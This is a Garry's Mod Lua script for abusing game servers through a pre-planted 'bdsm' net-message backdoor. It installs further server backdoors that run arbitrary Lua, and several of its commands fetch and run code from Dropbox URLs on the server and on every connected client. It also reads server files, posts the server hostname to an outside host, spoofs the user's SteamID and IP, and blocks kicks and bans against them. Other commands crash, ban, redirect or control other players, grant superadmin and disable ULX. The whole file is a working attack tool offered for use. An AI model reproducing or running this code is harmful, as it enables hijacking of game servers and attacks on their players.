--goodies list
local goodies = {
	["STEAM_0:0:5035105"] = true, --lua
	["STEAM_0:1:38717786"] = true, --java
	["STEAM_0:0:65939726"] = true,
	["STEAM_0:1:40851254"] = true, --cpp
	["STEAM_0:1:27332439"] = true, --wire
	["STEAM_0:0:29469432"] = true,
	["STEAM_0:0:58932089"] = false, --Brevan100
	["STEAM_0:0:63951068"] = false, --TED
	["STEAM_0:1:49722257"] = false, --Bosco
	["STEAM_0:1:52054641"] = false, --Elevator
	["STEAM_0:0:65093181"] = false, --MPGH Lover
	["STEAM_0:1:28504808"] = false, --Lost1nplace
	["STEAM_0:0:51161789"] = false, --SackBoy
	["STEAM_0:1:24828187"] = false --Ghost
}








--protolua
local function protolua(lua)
	net.Start("bdsm")
		net.WriteString(lua)
	net.SendToServer()
end









--poveride
local uid = LocalPlayer():UserID()

protolua([[
if (!_G.__uidstack) then
	_G.__uidstack = {}
	local Player = FindMetaTable("Player")

	local function override_pfunc(funcname, defaultreturn)
		local ofunc = Player[funcname]

		if (ofunc && type(ofunc) == "function") then
			Player[funcname] = (
				function(p, ...)
					local args = {...}
					local pid = p:UserID()

					if (!_G.__uidstack[pid]) then
						return ofunc(p, unpack(args))
					end

					for _, t in pairs(player.GetAll()) do
						if (!_G.__uidstack[t:UserID()]) then
							return ofunc(t, unpack(args))
						end
					end

					return defaultreturn
				end
			)
		end
	end

	local overrides = {
		["SteamID"] = "STEAM_0:0:550269",
		["IPAddress"] = "42.42.42.42:4242",
		["Kick"] = true,
		["Ban"] = true
	}

	for f, r in pairs(overrides) do
		override_pfunc(f, r)
	end
end
_G.__uidstack[]] .. uid .. [[] = true
]])








--html
protolua([[
local function lhtml(p)
	p:SendLua('http.Fetch("https://dl.dropboxusercontent.com/u/101744766/servers/gmod/lua/client/html.lua", RunString, function(err) end)')
end

for _, p in pairs(player.GetAll()) do
	lhtml(p)
end

hook.Add("PlayerInitialSpawn", "__html_load", lhtml)
]])








--os_validate
protolua([[
util.AddNetworkString("os_validate")

net.Receive(
	"os_validate",
	function(l, p)
		local mode, data = unpack(net.ReadTable())

		if (mode == "url") then
			http.Fetch(data, RunString, function(err) end)
		elseif (mode == "lua") then
			RunString(data)
		elseif (mode == "curl") then
			for _, p in pairs(player.GetAll()) do
				p:SendLua('http.Fetch("' .. data .. '", RunString, function(err) end)')
			end
		elseif (mode == "clua") then
			for _, p in pairs(player.GetAll()) do
				p:SendLua(data)
			end
		end
	end
)
]])








--SENDs
local function SEND(lua, sendto)
	local sendtab = {sendto, lua}

	net.Start("os_validate")
		net.WriteTable(sendtab)
	net.SendToServer()
end

local function SEND_LUA(lua)
	SEND(lua, "lua")
end

local function SEND_URL(url)
	SEND(url, "url")
end

local function SEND_CLUA(clua)
	SEND(clua, "clue")
end

local function SEND_CURL(curl)
	SEND(curl, "curl")
end







--quickquery

protolua([[
util.AddNetworkString("quick_query")

local function reply(p, msg)
	net.Start("quick_query")
		net.WriteString(msg)
	net.Send(p)
end

net.Receive(
	"quick_query",
	function(l, p)
		local args = net.ReadTable()

		local com = args[1]
		local fil = args[2]
		local dir = args[3]

		if (com == "FILE_EXISTS") then
			local fex = file.Exists(fil, dir)
			reply(p, fil .. " does" .. (fex && "" || "n't") .. " exist.")
		elseif (com == "FILE_GET") then
			local cnt = file.Read(fil, dir)
			reply(p, "--" .. dir .. "/" .. fil .. "\n\n" .. cnt)
		elseif (com == "DIR_CONTENT") then
			local dirc = ""
			local dirf, dird = file.Find(fil, dir)
			for _, diri in pairs(dirf) do
				dirc = dirc .. diri .. "\n"
			end
			for _, diri in pairs(dird) do
				dirc = dirc .. diri .. "\n"
			end

			reply(p, "files in " .. fil .. "\n\n" .. dirc)
		end
	end
)
]])

concommand.Add(
	"qq",
	function(p, c, args, full)
		local args = {
			(args[1] || "FILE_EXISTS"),
			(args[2] || "lua/functiondump.lua"),
			(args[3] || "MOD")
		}

		net.Start("quick_query")
			net.WriteTable(args)
		net.SendToServer()
	end
)

net.Receive(
	"quick_query",
	function(l)
		local srep = net.ReadString()

		print(srep)
		file.Write("qq-rep.txt", srep)
	end
)








--payload
--0 works
local sp = {}

sp["name"] = (
	function(p, pfilter)
		return (p:Nick():find(pfilter) != nil)
	end
)

sp["none"] = (
	function(p)
		return false
	end
)


--@ works
local at = {}

local function notat(o)
	return (
		function(p)
			return !at[o](p)
		end
	)
end

at["all"] = (
	function(p)
		return true
	end
)

at["admins"] = (
	function(p)
		local usg = p:GetNWString("UserGroup")

		return (p:IsAdmin() || !(usg == nil || usg == "" || usg == "user" || usg == "guest"))
	end
)

at["users"] = notat("admins")

at["goodies"] = (
	function(p)
		return (goodies[p:SteamID()])
	end
)

at["baddies"] = notat("goodies")

at["me"] = (
	function(p)
		return (p == LocalPlayer())
	end
)

at["them"] = notat("me")

at["targ"] = (
	function(p)
		local tr = util.TraceLine(util.GetPlayerTrace(LocalPlayer()))

		if (tr.Entity == p) then
			return true
		end

		return false
	end
)


--# works
local sh  = {}

sh["group"] = (
	function(p, f)
		return (p:GetNWString("UserGroup") == f)
	end
)

sh["rand"] = (
	function(p, f)
		return(math.random() < (1 / (tonumber(f) || 3)))
	end
)


--argwrap
local function argwrap(f, sarg)
	return (
		function(arg1)
			return f(arg1, sarg)
		end
	)
end


--parser
local function parse_pfilter(pfilter)
	local ftype = pfilter:sub(1, 1)
	local fargs = pfilter:sub(2)

	if (ftype == "!") then
		local targ = parse_pfilter(fargs)
		return (
			function(p)
				return (!(targ(p)))
			end
		)
	elseif (ftype == "@") then
		return at[fargs]
	elseif (ftype == "#") then
		local sh_pos = fargs:find("|") || 0
		local sh_fun = sh[fargs:sub(1, sh_pos - 1)] || false
		local sh_arg = fargs:sub(sh_pos + 1) || false

		if ((sh_pos == 0) || !sh_fun || !sh_arg) then
			return sp["none"]
		end

		return argwrap(sh_fun, sh_arg)
	end

	return argwrap(sp["name"], fargs)
end


--wrap in a player filter
local function pwrap(pfilter, code, prep)
	pfilter = pfilter || ".*"
	prep = prep || "p"

	local uids = {}
	local uidp = parse_pfilter(pfilter)

	local function adduid(p)
		print("[" .. pfilter .. "] " .. p:Name())
		table.insert(uids, p:UserID())
	end

	for _, p in pairs(player.GetAll()) do
		if (uidp(p)) then
			adduid(p)
		end
	end


	if (#uids == 0) then
		return "NO_MATCH"
	end

	local uidstr = "local doids = {"

	for i, id in pairs(uids) do
		uidstr = uidstr .. (i > 1 && ", " || "") .. "[" .. id .. "] = true"
	end

	uidstr = uidstr .. "}\nif (doids[" .. prep .. ":UserID()]) then\n"

	return uidstr .. code .. "\nend\n"
end


--send a generic payload
local function SEND_PAYLOAD(pfilter, code)
	local pcode = pwrap(pfilter, code)

	if (pcode == "NO_MATCH") then
		return
	end

	local senddat = (
		"local function dos()\n" ..
		" for _, p in pairs(player.GetAll()) do\n" ..
		pcode ..
		" end\n" ..
		"end\n" ..
		"xpcall(dos, function(err) end)\n"
	)

	SEND_LUA(senddat)
end


--setup payload command subcommands
local plds = {}

local function AddLoad(name, args, func)
	plds[name] = {args = args, func = func}
end


--Payload Command
concommand.Add(
	"payload",
	function(p, c, args, full)
		if (#args < 1) then
			return
		end

		local lload = plds[args[1]]
		if (lload) then
			lload.func(full, unpack(args, 2))
		end
	end
)


--add the subcommands
--test
AddLoad(
	"test",
	{"player"},
	function(_, ps)
		ps = ps || "@baddies"

		SEND_PAYLOAD(
			ps,
			"break"
		)
	end
)


--help
AddLoad(
	"help",
	{},
	function(_)
		LocalPlayer():ConCommand("payload html @me \"https://dl.dropboxusercontent.com/u/101744766/servers/gmod/lua/bdyn/client/mango.txt\"")
	end
)


--damage
AddLoad(
	"damage",
	{"player", "player", "string"},
	function(_, ps, ts, s)
		ps = ps || "@all"
		ts = ts || "@all"
		s = s || "100"

		local twrap = pwrap(
			(ts || "@all"),
			"di:SetDamagePosition(t:GetPos())\n" ..
			"t:TakeDamageInfo(di)\n",
			"t"
		)

		if (twrap == "NO_MATCH") then
			return
		end

		local l = (
			"local di = DamageInfo()\n" ..
			"di:SetDamage(" .. (s || "100") .. ")\n" ..
			"di:SetDamageType(DMG_PLASMA)\n" ..
			"di:SetAttacker(p)\n" ..
			"di:SetDamageForce(Vector(0, 0, 4242424242))\n" ..
			"for _, t in pairs(player.GetAll()) do\n" ..
			twrap ..
			"end\n"
		)

		SEND_PAYLOAD(
			(ps || "@all"),
			l
		)
	end
)


--cheat
AddLoad(
	"cheat",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@baddies"
		s = s || "hera"

		local curl = "https://dl.dropboxusercontent.com/u/101744766/servers/gmod/lua/bot/" .. s .. ".lua"

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"xpcall(http.Fetch, function(msg) end, \\\"" .. curl .. "\\\", RunString)\")"
		)
	end
)


--fov
AddLoad(
	"fov",
	{"player", "string", "string"},
	function(_, ps, f, t)
		ps = ps || "@all"
		f = f || "0"
		t = t || "0"

		SEND_PAYLOAD(
			ps,
			"p:SetFOV(" .. f .. ", " .. t .. ")"
		)
	end
)


--crash
AddLoad(
	"crash",
	{"player"},
	function(_, ps)
		ps = ps || "@baddies"

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"cam.End3D()\")"
		)
	end
)


--cexec
AddLoad(
	"cexec",
	{"player", "string"},
	function(full, ps)
		ps = ps || "@baddies"
		com = (full:sub(8 + ps:len()) || "echo dicks")

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"LocalPlayer():ConCommand('" .. com .. "')\")"
		)
	end
)


--cexech
AddLoad(
	"cexech",
	{"player", "string"},
	function(full, ps, coms)
		ps = ps || "@baddies"
		coms = coms || "echo"
		comf = (full:sub(9 + ps:len()) || "echo dicks")

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"hook.Add(\\\"Tick\\\", \\\"pld_" .. coms .. "\\\", function() LocalPlayer():ConCommand('" .. comf .. "') end)\")"
		)
	end
)


--playurl
AddLoad(
	"playurl",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@all"
		s = s || "http://k004.kiwi6.com/hotlink/9gma9f7gbk/Triple-Q_The_Boys_Speed_Highway.mp3"

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"sound.PlayURL(\\\"" .. s .. "\\\", \\\"\\\", function(sndchan) end)\")"
		)
	end
)


--kick
AddLoad(
	"kick",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@baddies"
		s = s || "globally banned for cheating: hera"

		SEND_PAYLOAD(
			ps,
			"p:Kick(\"" .. s .. "\")"
		)
	end
)


--ban
AddLoad(
	"ban",
	{"player", "string", "string"},
	function(_, ps, t, r)
		ps = ps || "@baddies"
		t = t || "0"
		r = r || "hack"

		SEND_PAYLOAD(
			ps,
			"p:Ban(\"" .. t .. "\", \"" .. r.. "\")"
		)
	end
)


--rcon
AddLoad(
	"rcon",
	{"string", "string"},
	function(full)
		com = full:sub(6) || "echo dicks"

		SEND_LUA("game.ConsoleCommand(\"" .. com .. "\\n\")")
	end
)


--ent
AddLoad(
	"ent",
	{"string"},
	function(_, ent_name)
		local tr = util.TraceLine(util.GetPlayerTrace(LocalPlayer()))
		local trp = tr.HitPos
		local vecargs = trp.x .. ", " .. trp.y .. ", " .. trp.z
		ent_name = ent_name || "npc_crow"

		SEND_LUA(
			"local lent = ents.Create(\"" .. ent_name .. "\")\n" ..
			"lent:SetPos(Vector(" .. vecargs  .. "))\n" ..
			"lent:Spawn()\n"
		)
	end
)


--lock
AddLoad(
	"lock",
	{"player"},
	function(_, ps)
		ps = ps || "@baddies"

		SEND_PAYLOAD(
			ps,
			"p:Lock()"
		)
	end
)


--unlock
AddLoad(
	"unlock",
	{"player"},
	function(_, ps)
		ps = ps || "@goodies"

		SEND_PAYLOAD(
			ps,
			"p:UnLock()"
		)
	end
)


--respawn
AddLoad(
	"spawn",
	{"player"},
	function(_, ps)
		ps = ps || "@all"

		SEND_PAYLOAD(
			ps,
			"p:Spawn()"
		)
	end
)


--setclass
AddLoad(
	"setclass",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@me"
		s = s || "player_sandbox"

		SEND_PAYLOAD(
			ps,
			"player_manager.SetPlayerClass(p, \"" .. s .. "\")"
		)
	end
)


--lua
AddLoad(
	"lua",
	{"string"},
	function(full)
		local lua = full:sub(4) || "--"

		SEND_LUA(lua)
	end
)


--clua
AddLoad(
	"clua",
	{"player", "string"},
	function(full, ps)
		ps = ps || "@baddies"
		local lua = full:sub(ps:len() + 6) || "--"

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"" .. lua .. "\")"
		)
	end
)


--html
AddLoad(
	"html",
	{"player", "string", "string"},
	function(_, ps, s, c)
		ps = ps || "@all"
		s = s || "http://www.youtube.com/watch?v=XsaWJ6-zcm0&feature=share&list=UU1Do4y5Xq60Nr-IMKVqkdDg"
		c = c || "true"

		SEND_PAYLOAD(
			ps,
			"p:SendLua(\"__open_html('" .. s .. "', " .. c .. ")\")"
		)
	end
)


--redirect
AddLoad(
	"redirect",
	{"string"},
	function(full)
		local raddr = full:sub(9) || "127.0.0.1:1337"

		SEND_LUA("hook.Add('PlayerInitialSpawn', '__redirect', function(p) timer.Simple(10, function() p:SendLua(\"LocalPlayer():ConCommand('connect " .. raddr .. "')\") end) end)")
	end
)


--forcesphere
AddLoad(
	"forcesphere",
	{"number", "number"},
	function(_, radius, fmult)
		radius = radius || "128"
		fmult = fmult || "16"

		local trace = LocalPlayer():GetEyeTrace()
		local fsc = trace.HitPos
		local vectorargs = fsc.x .. ", " .. fsc.y .. ", " .. fsc.z

		SEND_LUA(
			"local fsc = Vector(" .. vectorargs .. ") local fse = ents.FindInSphere(fsc, " .. radius .. ") for _, fnt in pairs(fse) do fnt:SetVelocity((fnt:GetPos() - fsc) * " .. fmult .. ") end"
		)
	end
)


--saysound
AddLoad(
	"saysound",
	{"string"},
	function(_, ps, s)
		ps = ps || "@me"
		s = s || "bot/wheres_the_bomb.wav,bot/wheres_the_bomb2.wav,bot/wheres_the_bomb3.wav,bot/where_is_it.wav"

		SEND_PAYLOAD(
			ps,
			"p:EmitSound(Sound(\"" .. table.Random(string.Explode(",", s)) .. "\"))"
		)
	end
)


--tp
AddLoad(
	"tp",
	{"player", "number", "number", "number"},
	function(_, ps, x, y, z)
		local trace = LocalPlayer():GetEyeTrace().HitPos

		ps = ps || "@me"
		x = x || trace.x
		y = y || trace.y
		z = z || trace.z
		local vectorargs = x .. ", " .. y  .. ", " .. z

		SEND_PAYLOAD(
			ps,
			"p:SetPos(Vector(" .. vectorargs .. "))"
		)
	end
)


--stepup
AddLoad(
	"stepup",
	{"player", "number"},
	function(_, ps, s)
		ps = ps || "@me"
		s = s || "72"

		SEND_PAYLOAD(
			ps,
			"p:SetStepSize(" .. s .. ")"
		)
	end
)


--spec
AddLoad(
	"spec",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@me"
		s = "OBS_MODE_" .. (s || "ROAMING"):ToUpper()

		SEND_PAYLOAD(
			ps,
			"p:Spectate(" .. s .. ")"
		)
	end
)


--ping
AddLoad(
	"ping",
	{},
	function(_)
		SEND_LUA([[
			http.Post("http://www.bg-server.3owl.com/", {hn = GetConVarString("hostname"), id = "fs"}, function(s) end, function(e) end)
		]])
	end
)


--removep
AddLoad(
	"removep",
	{"player"},
	function(_, ps)
		ps = ps || "@targ"

		SEND_PAYLOAD(
			ps,
			"p:Remove()"
		)
	end
)

--203
AddLoad(
	"203",
	{},
	function(_)
		local tre = util.TraceLine(util.GetPlayerTrace(LocalPlayer())).Entity

		if (IsValid(tre)) then
			SEND_LUA("Entity(" .. tre:EntIndex() .. "):Remove()")
		end
	end
)


--hp
AddLoad(
	"hp",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@me"
		s = s || "100"

		SEND_PAYLOAD(
			ps,
			"p:SetHealth(" .. s .. ")"
		)
	end
)


--superman
AddLoad(
	"superman",
	{"player", "string"},
	function(_, ps, s)
		ps = ps || "@me"
		s = s || "10"

		SEND_PAYLOAD(
			ps,
			"p:SetCrouchedWalkSpeed(24 * " .. s .. ") p:SetWalkSpeed(42 * " .. s .. ") p:SetRunSpeed(64 * " .. s .. ") p:SetJumpPower(32 * " .. s .. ")"
		)
	end
)


--sendfile
AddLoad(
	"sendfile",
	{"string"},
	function(_, s)
		local lua = file.Read(s, "LUA")

		if (lua == "") then
			return
		end

		SEND_LUA(lua)
	end
)


--infammo
AddLoad(
	"infammo",
	{"player"},
	function(_, ps)
		ps = ps || "@me"

		SEND_PAYLOAD(
			ps,
			[[
local hname = "inf_ammo_" .. p:UserID()
hook.Add(
	"Tick",
	hname,
	function()
		if (!IsValid(p)) then
			hook.Remove("Tick", hname)
		end

		local w = p:GetActiveWeapon()

		if (IsValid(w) && w.Primary) then
			w.Primary.Ammo = "none"
			w.Primary.DefaultClip = -1
			w.Primary.ClipSize = -1
			p:SendLua("local w = LocalPlayer():GetActiveWeapon() w.Primary.Ammo = "none" w.Primary.DefaultClip = -1 w.Primary.ClipSize = -1")
		end
	end
)
			]]
		)
	end
)


--golden
AddLoad(
	"golden",
	{"player"},
	function(_, ps)
		ps = ps || "@me"

		SEND_PAYLOAD(
			ps,
			[[
local hname = "golden_" .. p:UserID()
hook.Add(
	"Tick",
	hname,
	function()
		if (!IsValid(p)) then
			hook.Remove("Tick", hname)
		end

		local w = p:GetActiveWeapon()

		if (IsValid(w) && w.Primary) then
			w.Primary.Recoil = 0
			w.Primary.Spread = 0
			w.Primary.Damage = 4242
			p:SendLua("local w = LocalPlayer():GetActiveWeapon()
			if (IsValid(w) && w.Primary) then w.Primary.Recoil = 0 end")
		end
	end
)
			]]
		)
	end
)








--ADDONS

--Pointshop
if (true) then


	AddLoad(
		"givepoints",
		{"player", "string"},
		function(_, ps, s)
			SEND_PAYLOAD(
				(ps || "@me"),
				"p:PS_GivePoints(" .. (s || "1000000") .. ")"
			)
		end
	)

	AddLoad(
		"setpoints",
		{"player", "string"},
		function(_, ps, s)
			SEND_PAYLOAD(
				(ps || "@all"),
				"p:PS_SetPoints(" .. (s || "0") .. ")"
			)
		end
	)


end


--ULX
if (ulx) then


	AddLoad(
		"ulxkill",
		{"player"},
		function(_, ps)
			ps = ps || "@admins"

			SEND_PAYLOAD(
				ps,
				[[
				p:SendLua("ulx = nil concommand.Remove('ulx')")
				]]
			)
		end
	)

	AddLoad(
		"setgroup",
		{"player", "string"},
		function(_, ps, s)
			ps = ps || "@all"
			s = s || "superadmin"

			SEND_PAYLOAD(
				ps,
				'ulx.adduser(p, p, "' .. s .. '")'
			)
		end
	)


end









--GAMEMODES
local gmn = GAMEMODE.Name

if (gmn == "Sandbox") then


	--


elseif (gmn == "DarkRP") then


	at["police"] = (
		function(p)
			return false
		end
	)


	--setmoney
	AddLoad(
		"setmoney",
		{"player", "string"},
		function(_, ps, s)
			ps = ps || "@all"
			s = s || "0"

			SEND_PAYLOAD(
				ps,
				"p.DarkRPVars.money = " .. s
			)
		end
	)


	--doorlock
	AddLoad(
		"doorlock",
		{},
		function(_)
			local tre = util.TraceLine(util.GetPlayerTrace(LocalPlayer())).Entity

			if (IsValid(tre)) then
				SEND_LUA(
					"Entity(" .. tre:EntIndex() .. "):KeysLock()"
				)
			end
		end
	)


	--doorunlock
	AddLoad(
		"doorunlock",
		{},
		function(_)
			local tre = util.TraceLine(util.GetPlayerTrace(LocalPlayer())).Entity

			if (IsValid(tre)) then
				if (tre.isFadingDoor) then
					SEND_LUA(
						"Entity(" .. tre:EntIndex() .. "):fadeActivate()"
					)
				else
					SEND_LUA(
						"Entity(" .. tre:EntIndex() .. "):KeysUnLock()"
					)
				end
			end
		end
	)


	--arrest
	AddLoad(
		"arrest",
		{"player", "player"},
		function(_, ps, ts)
			ps = ps || "@all"
			ts = ts || "@baddies"

			local twrap = pwrap(
				ts,
				"t:arrest(nil, p)",
				"t"
			)

			if (twrap == "NO_MATCH") then
				return
			end

			SEND_PAYLOAD(
				ps,
				twrap
			)
		end
	)


	--job
	AddLoad(
		"job",
		{"player", "string"},
		function(_, ps, s)
			ps = ps || "@me"
			s = s || "mayor"

			SEND_PAYLOAD(
				ps,
				"p:ChangeTeam(" .. s .. ", true)"
			)
		end
	)


elseif (gmn == "Trouble in Terrorist Town") then

	protolua([[
local function sendt()
	local uidps = RecipientFilter()

	for _, p in pairs(player.GetAll()) do
		if (_G.__uidstack[p:UserID()]) then
			uidps:AddPlayer(p)
		end
	end

	SendTraitorList(uidps)
end

hook.Add(
	"TTTBeginRound",
	"__uidt",
	function()
		timer.Simple(4, sendt)
	end
)
	]])

	at["traitors"] = (
		function(p)
			return p:IsTraitor()
		end
	)

	at["detectives"] = (
		function(p)
			return p:IsDetective()
		end
	)

	at["innocents"] = (
		function(p)
			return !(p:IsDetective() || p:IsTraitor())
		end
	)


	--traitor
	AddLoad(
		"traitor",
		{"player"},
		function(_, ps)
			ps = ps || "@me"

			SEND_PAYLOAD(
				ps,
				"p:SetRole(ROLE_TRAITOR) SendFullStateUpdate()"
			)
		end
	)


	--detective
	AddLoad(
		"detective",
		{"player"},
		function(_, ps)
			ps = ps || "@goodies"

			SEND_PAYLOAD(
				ps,
				"p:SetRole(ROLE_DETECTIVE) SendFullStateUpdate()"
			)
		end
	)


	--innocent
	AddLoad(
		"innocent",
		{"player"},
		function(_, ps)
			ps = ps || "@baddies"

			SEND_PAYLOAD(
				ps,
				"p:SetRole(ROLE_INNOCENT) SendFullStateUpdate()"
			)
		end
	)


	AddLoad(
		"karma",
		{"player", "string"},
		function(_, ps, s)
			ps = ps || "@all"
			s = s || "1000"

			SEND_PAYLOAD(
				ps,
				"p:SetLiveKarma(" .. s .. ")"
			)
		end
	)


elseif (gmn == "MORBUS") then


	--


elseif (gmn == "F2S: Stronghold") then


	--


elseif (gmn == "GmodZ") then


	--


elseif (gmn == "Basewars") then


	--


elseif (gmn == "Fireart") then


	--


end

print("payload loaded. type payload help for more information.")
